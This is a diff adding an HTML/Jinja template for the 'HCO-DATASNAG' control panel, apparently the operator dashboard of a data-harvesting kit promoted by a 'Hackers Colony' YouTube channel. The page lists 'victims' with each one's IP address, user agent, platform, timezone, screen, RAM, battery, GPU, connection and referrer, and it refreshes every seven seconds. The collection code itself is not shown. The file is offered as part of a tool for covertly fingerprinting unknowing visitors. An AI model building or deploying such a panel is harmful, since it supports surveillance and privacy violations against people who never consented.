@@ -1,0 +1,38 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>HCO-DATASNAG</title>
+  <style>
+    body { background:#000; color:#0f0; font-family: monospace; padding: 10px; }
+    .row { margin-bottom:12px; border-bottom:1px solid #0f0; padding-bottom:4px;}
+    .header { font-size: 20px; margin-bottom: 20px; }
+    .footer { position: fixed; bottom:0; width:100%; text-align:center; font-size:12px; }
+  </style>
+  <script>
+    setInterval(()=> location.reload(), 7000);
+  </script>
+</head>
+<body>
+  <div class="header">[ HCO‑DATASNAG CONTROL PANEL ]</div>
+  {% for v in victims %}
+    <div class="row">
+      <div><b>Time:</b> {{v.time}}</div>
+      <div><b>IP:</b> {{v.ip.ip}}</div>
+      <div><b>UA:</b> {{v.ua}}</div>
+      <div><b>Platform:</b> {{v.platform}}</div>
+      <div><b>Language:</b> {{v.language}}</div>
+      <div><b>Screen:</b> {{v.screen.w}}×{{v.screen.h}}</div>
+      <div><b>Timezone:</b> {{v.timezone}}</div>
+      <div><b>RAM:</b> {{v.ram}}</div>
+      <div><b>Battery:</b> lvl {{v.battery.level}}, charging {{v.battery.charging}}</div>
+      <div><b>GPU:</b> {{v.gpu}}</div>
+      <div><b>Connection:</b> {{v.connection}}</div>
+      <div><b>Referrer:</b> {{v.referrer}}</div>
+    </div>
+  {% endfor %}
+  <div class="footer">
+    ⚡ Powered by Hackers Colony — YouTube: <a href="https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya" style="color:#0f0" target="_blank">@hackers_colony_tech</a>
+  </div>
+</body>
+</html>
